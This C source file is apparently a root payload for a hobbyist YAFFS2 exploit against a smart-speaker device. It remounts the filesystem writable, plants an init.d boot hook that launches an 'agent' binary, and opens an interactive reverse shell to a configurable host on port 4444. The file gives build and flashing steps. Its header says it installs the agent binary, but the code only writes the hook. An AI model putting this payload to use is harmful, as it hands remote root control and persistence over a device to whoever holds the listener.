/*
 * Minimal payload that runs as root after the YAFFS2 exploit fires.
 *
 * It is launched by call_usermodehelper as /factory_setting/s
 * (after the shellcode remounts factory_setting rw+exec).
 *
 * What it does:
 *   1. Opens a reverse shell back to the Pi for interactive access
 *   2. Installs the voice agent binary into persistent storage
 *   3. Writes an init.d script so the agent starts on every boot
 *
 * Build:
 *   arm-linux-gnueabi-gcc -static -Os -o payload_elf agent_elf.c
 *   # copy to factory_setting/s via NandBug before flashing poisoned cache
 *
 * Configure PI_IP and PI_PORT before building.
 */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/stat.h>
#include <fcntl.h>

#define PI_IP   "192.168.1.100"   /* Your Pi's IP on the Mini's network */
#define PI_PORT 4444

/* Remount rootfs rw so we can install files */
static void remount_rw(void) {
    system("mount -o remount,rw /");
    system("mount -o remount,rw /system 2>/dev/null");
}

/* Write the init.d hook so the agent survives reboots */
static void install_hook(void) {
    const char *initd = "/etc/init.d/S99agent";
    FILE *f = fopen(initd, "w");
    if (!f) return;
    fprintf(f,
        "#!/bin/sh\n"
        "case \"$1\" in\n"
        "  start) /usr/local/bin/agent &;;\n"
        "  stop)  killall agent 2>/dev/null;;\n"
        "esac\n");
    fclose(f);
    chmod(initd, 0755);
    /* symlink into rc5.d */
    symlink(initd, "/etc/rc5.d/S99agent");
}

/* Open reverse shell to the Pi */
static void reverse_shell(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;

    struct sockaddr_in addr = {0};
    addr.sin_family      = AF_INET;
    addr.sin_port        = htons(PI_PORT);
    addr.sin_addr.s_addr = inet_addr(PI_IP);

    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        close(sock);
        return;
    }

    /* Redirect stdin/stdout/stderr to the socket */
    dup2(sock, 0);
    dup2(sock, 1);
    dup2(sock, 2);
    close(sock);

    execl("/bin/sh", "sh", "-i", NULL);
}

int main(void) {
    remount_rw();
    install_hook();

    /* Try reverse shell; if the Pi isn't listening, we still installed the hook */
    reverse_shell();
    return 0;
}
